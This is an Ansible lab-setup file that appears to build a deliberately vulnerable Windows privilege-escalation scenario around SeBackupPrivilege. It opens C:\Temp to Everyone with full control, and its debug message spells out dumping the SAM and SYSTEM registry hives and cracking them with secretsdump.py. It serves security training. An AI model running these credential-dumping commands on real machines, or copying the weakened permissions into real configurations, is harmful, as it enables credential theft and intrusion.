---
# SeBackupPrivilege Lab Setup
# Grants SeBackupPrivilege to the victim user so they can bypass file ACLs
# and dump the SAM/SYSTEM hives to extract credentials.
#
# Reference: https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md

- name: Create temp exfil directory (world-writable)
  ansible.windows.win_shell: |
    New-Item -ItemType Directory -Force -Path "C:\Temp" | Out-Null
    icacls "C:\Temp" /grant Everyone:F | Out-Null

- name: Print SeBackupPrivilege scenario info
  ansible.builtin.debug:
    msg:
      - "=== SeBackupPrivilege Scenario ==="
      - "User '{{ ludus_win_privesc_victim_user }}' has SeBackupPrivilege."
      - "Copy hives: reg save HKLM\\SAM C:\\Temp\\sam.hive"
      - "           reg save HKLM\\SYSTEM C:\\Temp\\system.hive"
      - "Then crack with: secretsdump.py -sam sam.hive -system system.hive LOCAL"
